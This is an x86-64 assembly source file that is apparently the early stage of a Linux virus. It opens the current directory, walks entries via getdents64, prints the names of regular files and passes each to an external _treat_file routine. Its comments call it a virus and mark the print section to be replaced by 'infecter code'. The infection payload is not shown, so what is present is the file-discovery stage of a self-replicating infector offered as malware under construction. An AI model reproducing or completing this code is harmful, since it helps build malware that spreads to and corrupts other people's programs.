;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; struct linux_dirent64 {													;
;	int64_t			d_ino;		// 64-bit inode number			| offset 0	;
;	int64_t			d_off;		// 64-bit offset to next struct	| offset 8	;
;	unsigned short	d_reclen;	// size of this dirent			| offset 16	;
;	unsigned char	d_type;		// File type					| offset 18	;
;	char			d_name[];	// file name					| offset 19	;
; }																			;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


section .text
	global _start
	extern _treat_file

_start:
	push rbp
	mov rbp, rsp
	sub rsp, 16
	sub rsp, 320
	; rsp + 0: dir struct
	; rsp + 280: virus size
	; rsp + 288: fd directory
	; rsp + 296: pointer to current dir file
	; rsp + 304: unused
	; rsp + 312: unused

_calculate_start_of_virus:
	xor r10, r10 ; r10 = 0
;	lea r10, [rel _size_end] ; r10 = &_size_end
;	sub r10, [rel _start] ; r10 -= &start
;	mov QWORD [rsp + 280], r10 ; virus size = r10

_open_dir:
	push 0x00002f2e ; push "./"
	mov rdi, rsp ; mov the stack address on rdi, he first argument
	xor rsi, rsi ; rsi = 0
	xor rdx, rdx ; rdx = 0
	mov rax, 0x2 ; open syscall number
	syscall ; open
	pop rdi ; we pushed, so we pop
	cmp rax, -1 ; if open return something under or equal of -1, jump to end
	jle _end
	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)

_file_loop:
	mov rdx, 280 ; rdx = 0, set the count of getdents to 0, cose it's ignored
	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
	mov rsi, rsp ; mov the stack pointer to the second argument
	mov rax, 217 ; getdents64 syscall number
	syscall
	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
	jle _end
	mov r10, rax ; mov to r10 the number of bytes readed
	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
	mov rsi, rsp ; initialize rsi with our buffer address on the stack
	mov QWORD [rsp + 296], rsi

_read_data:
	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; here is a part to print the ;
;  datas. replace it by the   ;
;        infecter code        ;
	xor r12, r12 ; r12 = 0
	mov r12b, BYTE [rsi + 18] ; at offset  
	cmp r12, 8
	jne _continue
	mov rdi, 1 ; write(1, ..., ...) ;
	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
	xor rdx, rdx

; counting string len
_count_str_size:
	cmp BYTE [rsi + rdx], 0
	je _continue_print
	inc rdx
	jmp _count_str_size

_continue_print:
	mov rax, 1 ; write syscall number
	syscall
	mov rdi, rsi
	call _treat_file
;	sub rsi, 19 ; decrease offset
	mov rsi, [rsp + 296]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_continue:
	xor r11, r11 ; clear r11
	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
	add rsi, r11 ; we add this len on our current struct address to access next struct
	mov QWORD [rsp + 296], rsi
	jmp _read_data
	
_end:
	mov rax, 60 ; exit syscall number, will not be in final code
	mov rdi, 0
	syscall
	leave
	ret

_size_end:
